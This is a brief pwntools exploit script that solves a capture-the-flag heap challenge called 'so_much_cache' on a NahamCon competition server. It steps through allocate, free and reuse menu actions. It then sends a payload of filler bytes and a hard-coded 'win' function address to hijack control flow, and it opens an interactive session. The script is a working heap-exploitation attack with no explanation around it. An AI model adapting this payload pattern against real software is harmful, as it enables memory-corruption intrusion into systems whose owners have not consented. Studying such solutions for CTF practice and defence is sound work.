# just write over heap and jump to win function

from pwn import *
#p = process('./so_much_cache')
p = remote('challenge.nahamcon.com', 30227)
context.log_level = 'debug'
p.sendlineafter(b'select [1-5] : ',b'1')
p.sendlineafter(b'[?] size : ',b'80')
p.sendafter(b'[?] data : ',b'aaa')
p.sendlineafter(b'select [1-5] : ',b'4')
p.sendlineafter(b'select [1-5] : ',b'2')
p.sendlineafter(b'select [1-5] : ',b'1')
p.sendlineafter(b'[?] size : ',b'80')
win = 0x4009ae
p.sendafter(b'[?] data : ',b'b'*80+b'c'*16+p64(win)*3)
p.sendlineafter(b'select [1-5] : ',b'5')
p.sendlineafter(b'(1, 2, or 3)\n', b'2')
p.interactive() 
